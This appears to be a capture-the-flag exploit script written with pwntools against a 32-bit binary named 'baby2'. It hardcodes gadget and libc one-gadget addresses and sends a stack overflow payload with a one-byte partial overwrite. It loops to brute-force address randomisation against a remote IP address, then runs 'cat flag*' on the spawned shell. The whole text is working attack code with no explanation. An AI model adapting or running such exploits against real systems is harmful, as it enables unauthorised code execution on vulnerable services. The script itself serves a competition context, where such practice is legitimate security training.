from pwn import *
#context.log_level='debug'
got=0x804a00c
read=0x8048330
leave=0x080483d8
rbp=0x0804850b
ppp=0x08048509
ret=0x080482fa
one=0x8048340
tmp=0xf75d8000+0x3ac69
k=0
while(1):
	k+=1
	log.info(k)
	#p=process("./baby2")
	p=remote("51.254.114.246",2222)
	#gdb.attach(p,'b *0x80484ae')
	payload=p32(tmp)*11
	payload=payload.ljust(0x2c,'\x00')
	payload+='\xb0'
	p.send(payload)
	try:
		p.sendline("cat flag*")
		data=p.read()
		log.info(data)
		raw_input()
	except Exception:
		p.close()
